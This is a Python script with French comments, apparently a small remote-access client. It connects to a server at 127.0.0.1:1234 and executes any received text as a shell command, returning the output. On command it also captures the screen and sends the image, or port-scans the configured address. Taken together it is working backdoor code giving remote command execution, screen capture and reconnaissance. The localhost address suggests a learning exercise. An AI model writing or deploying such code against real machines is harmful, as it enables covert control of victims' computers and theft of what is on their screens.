import socket
import subprocess
import pyautogui
import io

# Adresse IP et port du serveur
ip_address = '127.0.0.1'  # Adresse IP cible pour le scanner
port_number = 1234  # Port du serveur

# Fonction principale pour se connecter au serveur
def connect_to_server():
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))
    print("Connecté au serveur :)")

    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'quit':
                break
            elif command.lower() == 'screenshot':
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")
                buffer.seek(0)

                cs.send(str(len(buffer.getvalue())).encode())  # Taille de l'image
                cs.recv(1024)  # Accuser réception

                cs.sendall(buffer.getvalue())  # Envoyer l'image
                continue
            elif command.startswith("scan"):
                # Analyse des ports sur ip_address
                parts = command.split()
                if len(parts) != 3:  # Vérifie que la commande contient start_port et end_port
                    cs.send("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>".encode())
                    continue
                _, start_port, end_port = parts
                open_ports = scan_ports(int(start_port), int(end_port))
                output = f"Ports ouverts sur {ip_address}: {open_ports}"
                cs.send(output.encode())
                continue

            # Exécution des commandes système
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "Commande exécutée, pas de sortie !"
            cs.send(output.encode())
        except Exception as e:
            cs.send(f"Error: {e}".encode())
            print(f"Erreur : {e}")  # Afficher l'erreur pour déboguer
            break

    cs.close()

# Fonction pour scanner les ports sur l'adresse IP définie (ip_address)
def scan_ports(start_port, end_port):
    """
    Scanne une plage de ports sur l'adresse IP définie dans ip_address.
    :param start_port: Port de départ
    :param end_port: Port de fin
    :return: Liste des ports ouverts
    """
    open_ports = []
    print(f"Scanning {ip_address} de {start_port} à {end_port}...")
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)  # Timeout de 1 seconde
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                print(f"Port {port} est OUVERT.")
                open_ports.append(port)
            else:
                print(f"Port {port} est FERMÉ.")
            sock.close()
        except Exception as e:
            print(f"Erreur lors du scan du port {port}: {e}")
    return open_ports

if __name__ == "__main__":
    # Lancement de la connexion au serveur
    connect_to_server()
